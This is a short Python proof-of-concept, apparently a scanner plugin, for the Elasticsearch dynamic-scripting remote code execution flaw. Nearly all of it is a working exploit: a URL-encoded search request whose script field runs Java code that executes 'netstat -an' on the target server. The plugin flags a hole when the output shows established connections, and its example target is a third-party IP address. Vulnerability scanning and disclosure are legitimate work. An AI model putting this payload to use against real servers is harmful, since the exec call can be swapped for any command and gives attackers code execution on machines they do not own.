#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  Elasticsearch Remote Code Execution 
Reference :  http://bouk.co/blog/elasticsearch-rce/
             http://javaweb.org/?p=1300
Author    :  NoName
"""

import  re

def assign(service, arg):
    if service == "ip":
        return True, arg
        
def audit(arg):
    payload = arg[:-1]+":9200/_search?source=%7B%22size%22:1,%22query%22:%7B%22filtered%22:%7B%22query%22:%7B%22match_all%22:%7B%7D%7D%7D%7D,%22script_fields%22:%7B%22exp%22:%7B%22script%22:%22import%20java.util.*;%5Cnimport%20java.io.*;%5CnString%20str%20=%20%5C%22%5C%22;BufferedReader%20br%20=%20new%20BufferedReader(new%20InputStreamReader(Runtime.getRuntime().exec(%5C%22netstat%20-an%5C%22).getInputStream()));StringBuilder%20sb%20=%20new%20StringBuilder();while((str=br.readLine())!=null)%7Bsb.append(str);%7Dsb.toString();%22%7D%7D%7D"
    code, head, res, errcode, _ = curl.curl(payload)
    if code == 200:
        m = re.search("ESTABLISHED",res)
        if m:
            security_hole(arg[:-1]+payload)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ip', '8.8.8.8')[1])